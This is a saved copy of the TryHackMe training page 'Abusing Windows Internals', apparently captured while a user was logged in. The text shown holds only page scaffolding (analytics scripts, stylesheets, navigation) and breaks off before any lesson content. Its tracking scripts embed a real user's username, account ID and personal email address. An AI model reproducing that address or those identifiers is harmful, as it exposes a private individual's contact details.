<!DOCTYPE html>
<!-- saved from url=(0050)https://tryhackme.com/room/abusingwindowsinternals -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Abusing Windows Internals</title>
<meta name="description" content="Leverage windows internals components to evade common detection solutions, using modern tool-agnostic approaches.">
<meta name="og:description" content="Leverage windows internals components to evade common detection solutions, using modern tool-agnostic approaches.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Abusing Windows Internals">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/76910e7adb4cef3da9496c148b4c96c2.png">
<meta property="og:url" content="https://tryhackme.com/room/abusingwindowsinternals">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Leverage windows internals components to evade common detection solutions, using modern tool-agnostic approaches.">

<script type="text/javascript" async="" src="./TryHackMe _ Abusing Windows Internals_files/pgpbhph6"></script><script src="./TryHackMe _ Abusing Windows Internals_files/jquery.min.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Abusing Windows Internals_files/boostrap431.min.css">
<script src="./TryHackMe _ Abusing Windows Internals_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Abusing Windows Internals_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Abusing Windows Internals_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Abusing Windows Internals_files/general-style.css">
<script src="./TryHackMe _ Abusing Windows Internals_files/script.js"></script>
<script src="./TryHackMe _ Abusing Windows Internals_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Abusing Windows Internals_files/cookieconsent.min.css">
<script src="./TryHackMe _ Abusing Windows Internals_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Abusing Windows Internals_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Abusing Windows Internals_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Abusing Windows Internals_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><script async="" src="./TryHackMe _ Abusing Windows Internals_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style></style></head>


<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Abusing Windows Internals_files/scoreboard.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Abusing Windows Internals_files/introjs.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Abusing Windows Internals_files/slideout.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Abusing Windows Internals_files/public-rooms.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Abusing Windows Internals_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Abusing Windows Internals_files/prism.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Abusing Windows Internals_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
<script src="./TryHackMe _ Abusing Windows Internals_files/lottie-player.js"></script>

<div id="room-content">
<div id="room-content-main">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
<div class="container">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
<span class="thm-nav__hamburger-lines"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
<div class="navbar-brand" href="/">
<a href="https://tryhackme.com/dashboard">
<img width="115px" src="./TryHackMe _ Abusing Windows Internals_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="navbar-item-icon far fa-browser"></i>
<div class="navbar-item-text">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="navbar-item-icon far fa-book-open"></i>
<div class="navbar-item-text">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/abusingwindowsinternals#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-trophy"></i>
<div class="navbar-item-text">Compete</div>
</a>
<div class="dropdown-menu" aria-labelledby="navbarDropdown">
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
<div class="dropdown-menu-icon">
<i class="fas fa-trophy"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
<div class="dropdown-menu-icon">
<i class="fas fa-crown"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
<div class="dropdown-menu-icon">
<i class="fas fa-user-friends"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/abusingwindowsinternals#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
<div class="navbar-item-text">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
<span class="dropdown-menu-arrow"></span>
<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
</div>
</li>
<li class="nav-item">
<div class="nav-item-streak">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
<script>
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 18:47:44 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/abusingwindowsinternals#" id="notification-btn" role="button" data-toggle="dropdown">
<i id="notification-icon" class="fal fa-bell"></i>
<div id="notification-dot"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="notification-header">Notifications</div>
<div id="nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item dropdown">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/abusingwindowsinternals#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
<img src="./TryHackMe _ Abusing Windows Internals_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
